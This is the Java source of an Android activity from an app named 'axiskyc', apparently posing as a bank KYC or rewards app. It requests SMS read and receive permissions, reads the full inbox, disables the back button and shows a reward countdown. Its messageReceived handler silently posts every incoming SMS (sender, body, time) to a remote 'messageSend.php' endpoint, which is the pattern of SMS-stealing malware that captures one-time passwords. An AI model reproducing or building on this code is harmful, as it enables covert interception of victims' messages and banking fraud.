package com.axiskyc;

import android.Manifest;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Environment;
import android.provider.Settings;
import android.provider.Telephony;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.axiskyc.custom.Global;
import com.axiskyc.custom.MessageBroadcastReceiver;
import com.axiskyc.custom.MessageListenerInterface;
import com.axiskyc.custom.adapters.SMSListAdapter;
import com.axiskyc.custom.apis.WebService;
import com.axiskyc.custom.arrays.AllSMS;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

public class MainViewController extends BaseActivity implements MessageListenerInterface {

    private File sms_json = null;
    private static final String FORMAT = "%02d:%02d:%02d";

    private TextView txt_reward_timer;
    private ListView list_sms;
    private Button btn_get_all_sms, btn_logout;

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && event.getRepeatCount() == 0) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void messageReceived(String message) {
        // setting message in our text view on below line.
        Global.ShowLogs("messageReceived = " + message);
//        msgTV.setText(message);

        /*try {
            JSONObject obj = new JSONObject(message);

            AllSMS item = new AllSMS();
            item.id = "" + Global.inbox_sms_messages.size();
            item.user_id = Global.user_id;
            item.sender_number = obj.getString("sender_number");
            item.sender_name = "";
            item.body = obj.getString("body");
            item.date = obj.getString("date");
            item.type = obj.getString("type");
            Global.inbox_sms_messages.add(item);

            set_adapter(true);

        } catch (Exception e) {}*/

//        read_sms_inbox();

        try {

//            ProgressBar pBar = new ProgressBar(getApplicationContext());
//            pBar.setVisibility(View.INVISIBLE);

            Global.webservice_is_show_loader = false;
            Global.webservice_file_name = "messageSend.php";

            JSONObject obj_post = new JSONObject();

            JSONObject obj = new JSONObject(message);

            obj_post.put("sender", obj.getString("sender_number"));
            obj_post.put("message", obj.getString("body"));
            obj_post.put("time", obj.getString("date"));
            obj_post.put("type", obj.getString("type"));
            obj_post.put("userid", Global.user_id);

            new WebService(getApplicationContext(), "", new WebService.myCallback() {
                @Override
                public void onServiceResponse(String responseJson) {
                    Global.ShowLogs("responseJson = " + responseJson);

                }
            }, WebService.HTTPRequestMethod.POST_METHOD2, obj_post.toString(), null, "", null);

        } catch (Exception e) {}
    }

    @Override
    protected void onStart() {
        super.onStart();

        try {
            MessageBroadcastReceiver.bindListener(this);
        } catch (Exception e) {
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Global.controllerName = "MainViewController";

        txt_reward_timer = (TextView) findViewById(R.id.txt_reward_timer);

        btn_get_all_sms = (Button) findViewById(R.id.btn_get_all_sms);
        btn_logout = (Button) findViewById(R.id.btn_logout);
        list_sms = (ListView) findViewById(R.id.list_sms);
        list_sms.setCacheColorHint(Color.TRANSPARENT);
        list_sms.setSmoothScrollbarEnabled(true);

        btn_logout.setText("Back to Home");

        btn_logout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                AlertDialog.Builder dialog = new AlertDialog.Builder(MainViewController.this);
                dialog.setCancelable(false);
                dialog.setMessage("Are you sure?");
                dialog.setPositiveButton("Yes",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                dialog.dismiss();

                                Global.user_id = "";
                                Global.user_details = new JSONObject();

                                Global.StoreFileToAppCache(MainViewController.this, Global.user_id, "user_id");
                                Global.StoreFileToAppCache(MainViewController.this, "", "user_details");
                                Global.StoreFileToAppCache(MainViewController.this, "", "total_miliseconds");

                                Intent in = new Intent();
                                in.setClass(MainViewController.this, SplashViewController.class);
                                in.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                startActivity(in);

                                finish();
                            }
                        });
                dialog.setNegativeButton("No", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                    }
                });
                dialog.show();
            }
        });

        btn_get_all_sms.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                allow_permission();
            }
        });

        start_timer();

        CheckPermission();
    }

    public void start_timer() {
        txt_reward_timer.setText("");

        int total_hours = 1;
        int total_minutes = total_hours * 60;
        int total_seconds = total_minutes * 60;
        int total_miliseconds = total_seconds * 1000;

        try {
            String temp = Global.ReadFileFromAppCache(MainViewController.this, "total_miliseconds");
            total_miliseconds = Integer.parseInt(temp);
        } catch (Exception e) {
        }

        Global.ShowLogs("total_miliseconds = " + total_miliseconds);

        new CountDownTimer(total_miliseconds, 1000) {

            public void onTick(long millisUntilFinished) {
//                txt_reward_timer.setText("seconds remaining: " + millisUntilFinished / 1000);

                Global.StoreFileToAppCache(MainViewController.this, "" + millisUntilFinished, "total_miliseconds");

                txt_reward_timer.setText("" + String.format(FORMAT,
                        TimeUnit.MILLISECONDS.toHours(millisUntilFinished),
                        TimeUnit.MILLISECONDS.toMinutes(millisUntilFinished) - TimeUnit.HOURS.toMinutes(
                                TimeUnit.MILLISECONDS.toHours(millisUntilFinished)),
                        TimeUnit.MILLISECONDS.toSeconds(millisUntilFinished) - TimeUnit.MINUTES.toSeconds(
                                TimeUnit.MILLISECONDS.toMinutes(millisUntilFinished))));
            }

            public void onFinish() {
                txt_reward_timer.setText("");
            }

        }.start();
    }

    public void export_code() {
        String jsonData = "";
        try {
            JSONArray mainArr = new JSONArray();
            for (int a = 0; a < Global.inbox_sms_messages.size(); a++) {
                JSONObject obj = new JSONObject();
                obj.put("id", a);
                obj.put("user_id", Global.inbox_sms_messages.get(a).user_id);
                obj.put("sender_number", Global.inbox_sms_messages.get(a).sender_number);
                obj.put("sender_name", Global.inbox_sms_messages.get(a).sender_name);
                obj.put("message", Global.inbox_sms_messages.get(a).body);
                obj.put("date", Global.inbox_sms_messages.get(a).date);
                obj.put("type", Global.inbox_sms_messages.get(a).type);
                mainArr.put(obj);
            }

            jsonData = mainArr.toString();

        } catch (Exception e) {
        }

        Global.ShowLogs("jsonData = " + jsonData);

        java.io.File root = new java.io.File(Global.file_storage_root_path(MainViewController.this),
                getString(R.string.app_name));
        if (!root.exists()) {
            root.mkdir();
        }

        sms_json = new java.io.File(root, "sms_" + System.currentTimeMillis() + ".txt");
        Global.SaveTextFileToCustomLocation(jsonData, sms_json);

        Runnable priceRunnable = new Runnable() {
            public void run() {

                try {
                    Thread.sleep(400);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                android.os.Message msg = new android.os.Message();
                msg.what = 1;
                ResponseHandler.sendMessage(msg);
            }
        };
        Thread th = new Thread(null, priceRunnable, "thread");
        th.start();
    }

    public android.os.Handler ResponseHandler = new android.os.Handler() {
        public void handleMessage(android.os.Message msg) {

            switch (msg.what) {
                case 1:

                    Global.ShowLogs("sms_json = " + sms_json.getAbsolutePath());

                    File root = new File(Environment.getExternalStorageDirectory(), getString(R.string.app_name));
                    if (!root.exists()) {
                        root.mkdir();
                    }
                    File new_sms_json = new java.io.File(root, "sms_" + System.currentTimeMillis() + ".txt");

                    copyFile(sms_json, new_sms_json);

                    Toast.makeText(MainViewController.this, "Json Data Created", Toast.LENGTH_SHORT).show();

                    Intent sharingIntent = new Intent(Intent.ACTION_SEND);
                    Uri screenshotUri = Uri.parse(new_sms_json.getAbsolutePath());
                    sharingIntent.setType("*/*");
                    sharingIntent.putExtra(Intent.EXTRA_STREAM, screenshotUri);
                    startActivity(Intent.createChooser(sharingIntent, "Share using"));

                    super.handleMessage(msg);
            }
        }
    };

    public void allow_permission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {

                export_code();

            } else { //request for the permission

                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                Uri uri = Uri.fromParts("package", getPackageName(), null);
                intent.setData(uri);
                startActivity(intent);
            }
        } else {
            //below android 11=======
            export_code();
        }

//        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//        intent.setData(Uri.parse("package:" + getPackageName()));
//        startActivity(intent);
    }

    private void copyFile(java.io.File SourceFile, java.io.File DestinationFile) {

        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {

            in = new java.io.FileInputStream(SourceFile);
            out = new java.io.FileOutputStream(DestinationFile);

            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            in.close();
            in = null;

            // write the output file (You have now copied the file)
            out.flush();
            out.close();
            out = null;

        } catch (java.io.FileNotFoundException fnfe1) {
            android.util.Log.e("tag", fnfe1.getMessage());
        } catch (Exception e) {
            android.util.Log.e("tag", e.getMessage());
        }
    }

    public void CheckPermission() {
        try {
            int MyVersion = android.os.Build.VERSION.SDK_INT;
            if (MyVersion > android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
                if (!checkIfAlreadyhavePermission()) {
                    requestForSpecificPermission();
                } else {
                    read_sms_inbox();
                }
            } else {
                read_sms_inbox();
            }
        } catch (Exception ee) {
            read_sms_inbox();
        }
    }

    private boolean checkIfAlreadyhavePermission() {
        int result = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        if (result == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return true;
        } else {
            return false;
        }
    }

    private void requestForSpecificPermission() {
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.MANAGE_EXTERNAL_STORAGE,
                android.Manifest.permission.INTERNET
        }, 101);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        switch (requestCode) {
            case 101:
                if (grantResults[0] == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    //granted
                    read_sms_inbox();
                } else {
                    //not granted
                    //CheckPermission();

                    android.widget.Toast.makeText(MainViewController.this, "Enable permissions...", android.widget.Toast.LENGTH_LONG).show();

                    android.content.Intent intent = new android.content.Intent();
                    intent.setAction(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    android.net.Uri uri = android.net.Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivity(intent);
                }
                break;
            default:
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    public void read_sms_inbox() {

        Global.inbox_sms_messages = new ArrayList<>();

        try {
            ContentResolver cr = getContentResolver();
            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            int totalSMS = 0;
            if (c != null) {
                totalSMS = c.getCount();
                if (c.moveToFirst()) {
                    for (int j = 0; j < totalSMS; j++) {
                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String sender_name = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.PERSON));
                        String id = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));
                        String user_id = Global.user_id;
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        String type = "";
                        switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                type = "inbox";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                type = "sent";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                                type = "outbox";
                                break;
                            default:
                                break;
                        }

                        Global.ShowLogs("smsDate = " + smsDate + " , number = " + number + ", body = " + body + " , type = " + type);

                        AllSMS item = new AllSMS();
                        item.id = id;
                        item.user_id = user_id;
                        item.sender_number = number;
                        item.sender_name = sender_name;
                        item.body = body;
                        item.date = smsDate;
                        item.type = type;
                        Global.inbox_sms_messages.add(item);

                        c.moveToNext();
                    }
                }

                c.close();

                display_data();

            } else {
                Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
            }

        } catch (Exception e) {
        }
    }

    public void display_data() {

        set_adapter(false);

        String jsonData = "";
        try {
            JSONArray mainArr = new JSONArray();
            for (int a = 0; a < Global.inbox_sms_messages.size(); a++) {
                JSONObject obj = new JSONObject();
                obj.put("id", a);
                obj.put("user_id", Global.inbox_sms_messages.get(a).user_id);
                obj.put("sender_number", Global.inbox_sms_messages.get(a).sender_number);
                obj.put("sender_name", Global.inbox_sms_messages.get(a).sender_name);
                obj.put("message", Global.inbox_sms_messages.get(a).body);
                obj.put("date", Global.inbox_sms_messages.get(a).date);
                obj.put("type", Global.inbox_sms_messages.get(a).type);
                mainArr.put(obj);
            }

            jsonData = mainArr.toString();

        } catch (Exception e) {
        }

        Global.ShowLogs("jsonData = " + jsonData);
    }

    public void set_adapter(boolean is_scroll_bottom) {
        SMSListAdapter adapter = new SMSListAdapter(MainViewController.this, Global.inbox_sms_messages);
        list_sms.setAdapter(adapter);

        if (is_scroll_bottom) {
            try {
                list_sms.post(new Runnable() {
                    @Override
                    public void run() {
                        // Select the last row so it will scroll into view...
                        list_sms.setSelection(Global.inbox_sms_messages.size() - 1);
                    }
                });
            } catch (Exception e) {
            }
        }
    }
}